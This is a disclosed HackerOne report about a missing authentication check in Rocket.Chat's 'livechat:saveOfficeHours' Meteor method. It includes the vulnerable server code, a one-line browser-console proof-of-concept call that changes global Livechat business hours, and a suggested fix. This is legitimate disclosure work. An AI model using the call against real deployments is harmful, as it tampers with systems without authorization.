# Unauthenticated clients can modify Livechat Business Hours

## Report Details
- **Report ID**: 1063164
- **URL**: https://hackerone.com/reports/1063164
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-12-21T01:30:35.237Z
- **Disclosed**: 2024-08-10T21:58:32.602Z

## Reporter
- **Username**: gronke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Summary:** Missing authentication of the `livechat:saveOfficeHours` Meteor.method allows unauthenticated clients set global Livechat Business Hours.

**Description:**

The Meteor Method `livechat:saveOfficeHours` directly forwards user inputs to the database model without authenticating the client:

```javascript
Meteor.methods({
	'livechat:saveOfficeHours'(day, start, finish, open) {
		console.log('Method "livechat:saveOfficeHour" is deprecated and will be removed after v4.0.0');
		LivechatBusinessHours.updateDayOfGlobalBusinessHour({
			day,
			start,
			finish,
			open,
		});
	},
});
```

## Releases Affected:

  * 3.9.3 / develop

## Steps To Reproduce (from initial installation to vulnerability):

1.) Open Rocket.Chat in a Browser
2.) Open Web Inspector
3.) Execute Meteor.call

```javascript
Meteor.call(
  'livechat:saveOfficeHours',
  'Monday', // day
  '00:23', // start
  '00:42', // finish
  true // open
);
```

## Suggested mitigation

  * Require a user role to edit livechat hours

## Impact

Unauthenticated clients can configure the Livechat Business Hours by calling a Meteor Method.

## Attachments
No attachments
